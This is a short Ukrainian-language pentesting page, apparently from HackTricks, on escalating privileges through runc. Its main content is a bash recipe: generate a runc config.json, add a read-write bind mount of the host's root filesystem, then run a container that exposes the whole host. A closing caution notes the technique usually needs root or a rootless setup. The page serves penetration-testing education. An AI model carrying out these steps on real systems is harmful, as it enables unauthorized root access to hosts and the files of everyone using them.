# RunC Привілейоване підвищення

{{#include ../../banners/hacktricks-training.md}}

## Основна інформація

Якщо ви хочете дізнатися більше про **runc**, перегляньте наступну сторінку:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Якщо ви виявите, що `runc` встановлений на хості, ви можете **запустити контейнер, змонтувавши кореневу / папку хоста**.
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Це не завжди буде працювати, оскільки за замовчуванням runc працює як root, тому запуск його як неправа користувача просто не може працювати (якщо у вас немає конфігурації без root). Зробити конфігурацію без root за замовчуванням зазвичай не є хорошою ідеєю, оскільки існує досить багато обмежень всередині контейнерів без root, які не застосовуються поза контейнерами без root.

{{#include ../../banners/hacktricks-training.md}}
